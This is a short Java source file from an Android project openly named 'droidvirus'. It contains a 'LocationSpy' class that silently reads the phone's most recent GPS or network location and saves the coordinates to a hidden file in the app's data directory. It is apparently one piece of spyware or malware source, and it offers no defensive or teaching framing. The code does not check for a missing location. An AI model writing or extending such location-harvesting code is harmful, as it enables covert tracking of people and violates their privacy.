package com.artisanter.droidvirus;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.location.Location;
import android.location.LocationManager;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;

public class LocationSpy {
    static Location getLastLocation(Context context) {
        LocationManager lManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

        assert lManager != null;
        Location locationGPS = lManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        Location locationNet = lManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

        long GPSLocationTime = 0;
        if (null != locationGPS) { GPSLocationTime = locationGPS.getTime(); }

        long NetLocationTime = 0;
        if (null != locationNet) { NetLocationTime = locationNet.getTime(); }

        Location loc;
        if ( 0 < GPSLocationTime - NetLocationTime ) {
            loc = locationGPS;
        } else {
            loc = locationNet;
        }

        return loc;
    }

    static void writeLocation(Context context){
        Location loc = getLastLocation(context);
        String locationFile = context.getApplicationInfo().dataDir + "/location";

        try {
            PrintWriter pw = new PrintWriter(locationFile);
            pw.println(loc.getLatitude() + " " + loc.getLongitude());
            pw.close();
        }
        catch (IOException ignored) {}
    }
}
